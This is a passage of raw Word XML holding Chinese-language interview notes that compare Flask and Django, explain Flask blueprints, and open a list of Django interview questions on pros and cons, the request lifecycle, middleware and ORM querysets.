    <w:p w14:paraId="6BB8D4B9" w14:textId="12C7D7BD" w:rsidR="00325D76" w:rsidRPr="007A6093" w:rsidRDefault="000A3959" w:rsidP="007A6093">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012</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753E994D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1 django有自己模板和路由和orm，没有服务，使用的是内置模块wsgiref。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC5A8BB" w14:textId="37168023" w:rsidR="00325D76" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2 flask 只有自己的路由，模板使用的是jinjia2，orm使用的是fask-sqlalchemy模块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="014D4D47" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3 flask 是轻量级框架，只封装了核心功能（路由），使用比较灵活。非常适用于小型网站，非常适用于开发web服务的API</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E6DA96" w14:textId="7D8C0FF6" w:rsidR="00325D76" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4 django 灵活自由度不如flask，Django非常适合企业级网站的开发：快速、靠谱、稳定</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745C7F5C" w14:textId="07D6DD03" w:rsidR="00325D76" w:rsidRPr="007A6093" w:rsidRDefault="000A3959" w:rsidP="007A6093">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013</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>flask</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="007A6093">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>蓝图：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8EE895" w14:textId="77777777" w:rsidR="00325D76" w:rsidRPr="0057133E" w:rsidRDefault="00325D76" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用蓝图来划分flask模块，解耦合解耦总结来说就是：你能知道的东西就写死，不知道但是又必须知道的东西，就让应用程序来告诉你，在java里面叫接口，在有些语言（OC, swift, C/C++）里面叫做代码段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0028FAE6" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="005B6F34" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>2020</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>年最新</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>经典面试问题与答案汇总</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>上</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>)-</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>大江狗整理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349DF0A9" w14:textId="4C55133A" w:rsidR="007A6093" w:rsidRPr="005B6F34" w:rsidRDefault="0057133E" w:rsidP="005B6F34">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001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的优点和缺点有哪些</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2647A8" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的优点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1997BDB8" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>功能完善、要素齐全：自带大量企业Web开发常用工具和框架（比如分页，auth，权限管理), 适合快速开发企业级网站。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D55EC78" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>完善的文档：经过十多年的发展和完善，Django有广泛的实践案例和完善的在线文档。开发者遇到问题时可以搜索在线文档寻求解决方案。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145DB361" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>强大的数据库访问组件：Django的Model层自带数据库ORM组件，使得开发者无须学习SQL语言即可对数据库进行操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B74669" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django先进的App设计理念: App是可插拔的，是不可多得的思想。不需要了，可以直接删除，对系统整体影响不大。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3715107F" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>自带台管理系统admin：只需要通过简单的几行配置和代码就可以实现一个完整的后台数据管理控制平台。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E26B69F" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的缺点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E38CD79" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大包大揽: 对于一些轻量级应用不需要的功能模块Django也包括了，不如Flask轻便。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142F8163" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>过度封装: 很多类和方法都封装了，直接使用比较简单，但改动起来就比较困难。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D837220" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>性能劣势: 与C, C++性能上相比，Django性能偏低，当然这是python的锅，其它python框架在流量上来后会有同样问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36BE3A8C" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板问题: django的模板实现了代码和样式完全分离，不允许模板里出现python代码，灵活度对某些程序员来说可能不够。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD8EFB1" w14:textId="28B9AE2B" w:rsidR="007A6093" w:rsidRPr="005B6F34" w:rsidRDefault="0057133E" w:rsidP="005B6F34">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002</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>说说看</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="005B6F34">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的请求生命周期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C02794B" w14:textId="56CCB57E" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="005B6F34">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="1A1A1A"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:noProof/>
          <w:color w:val="1A1A1A"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A3F40AF" wp14:editId="1FD0B33C">
            <wp:extent cx="7898458" cy="356235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907705" cy="3566521"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F42D6F" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注：最重要的是回答用户请求并不是一下子通过URL匹配就达到相应视图，返回数据也不是一下子就返回给用户，中间要经历层层中间件。这个面试题其实考的核心是中间件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037FA01E" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更多阅读：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522E597E" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="00D96E02" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId197" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(33): 中间件(middleware)的工作原理和应用场景举例</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="572C1243" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在生产环境，你还需要很清楚地描述下图流程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE19ABD" w14:textId="52DF9B75" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="001C47AF">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:color w:val="1A1A1A"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
          <w:noProof/>
          <w:color w:val="1A1A1A"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67A1653E" wp14:editId="5AC30BE7">
            <wp:extent cx="6686550" cy="32004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86550" cy="3200400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFA1B20" w14:textId="100598B1"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003</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请列举几个</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django ORM</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中常用的获取数据查询集</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>(queryset)</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EF8BFE" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>常用方法包括filter和exclude方法。字符串模糊匹配可以使用icontains, in等多种方法。随便举几个例子即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDA624B" w14:textId="0195EED7"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004</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>说说看</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
